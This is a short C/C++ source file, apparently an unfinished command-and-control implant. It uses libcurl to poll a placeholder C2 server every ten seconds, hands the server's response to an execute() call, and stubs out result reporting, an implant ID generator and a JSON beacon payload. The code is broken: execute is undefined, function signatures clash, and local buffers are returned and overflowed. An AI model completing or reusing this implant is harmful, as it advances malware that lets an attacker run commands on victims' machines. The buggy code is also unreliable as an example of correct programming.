/**post request, try initial communcation with c2, when working->
every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->post to payload**/
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <curl/curl.h>

#define SERVERNAME "placeholder"
#define SLEEP 10

size_t writeFunction(void *ptr, size_t size, size_t nmemb, std::string* data) {
    data->append((char*) ptr, size * nmemb);
    return size * nmemb;
}
void tasks(){
    while(1){
        Sleep(SLEEP);
        auto curl = curl_easy_init();
        if (curl) {
            curl_easy_setopt(curl, CURLOPT_URL, SERVERNAME);
            curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);
            curl_easy_setopt(curl, CURLOPT_USERPWD, "user:pass");
            curl_easy_setopt(curl, CURLOPT_USERAGENT, "curl/7.42.0");
            curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 5L);
            curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
            
            std::string response_string;
            std::string header_string;

            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeFunction);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);
            curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);
            long response_code;
            curl_easy_perform(curl);
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
            if(response_code==200){
                char * results=execute(response_string);
                sendresults(results);
            }
            curl_easy_cleanup(curl);
            curl = NULL;
        }
    }
}


int sendresults(){
    while(1){
        Sleep(SLEEP);
        //Send results, check response
        //If good response break
    }

}


// Random Implant ID in hex using rand()
// https://stackoverflow.com/questions/33325814/how-to-loop-generate-random-256bit-hex-in-c-or-c
char* random_id(){
    char random_hex[32+1];
    char * random_hexptr = random_hex;

    srand(time(0));
    for(int i = 0; i < 32; i++){
        sprintf(random_hex+i, "%x", rand() % 32);
    }
    
    return random_hexptr;
}


char* make_base_payload(char* implant_id){
    
    char payload[51] = "{\"implant_id\": }";
    char * payloadptr = payload;
    strcat(payload, implant_id);
    return payloadptr;

}




int main(int argc, char* argv[]){

    // char blah[33];
    // strcpy(blah, random_id());
    // printf("%s\n", blah);

   // register_();



    return 0;
}


